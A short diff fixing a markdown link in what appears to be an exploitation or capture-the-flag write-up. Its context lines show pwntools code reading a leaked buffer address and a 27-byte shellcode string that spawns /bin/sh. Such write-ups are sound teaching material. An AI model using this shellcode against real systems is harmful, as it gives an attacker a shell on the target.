@@ -32,7 +32,7 @@ So, first step, to obtain input buffer address:
   l = p.recvline()
   addr = int(l.decode('utf-8').split("0x")[1].rstrip(), 16)
    ```
-Next, generate a shellcode(27 bytes) for `excve("/bin/sh\0,null,null")`.  (I got mine from [shell-storm]:(http://shell-storm.org/shellcode/)):
+Next, generate a shellcode(27 bytes) for `excve("/bin/sh\0,null,null")`.  (I got mine from [shell-storm](http://shell-storm.org/shellcode/)):
 
   ```python
   sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
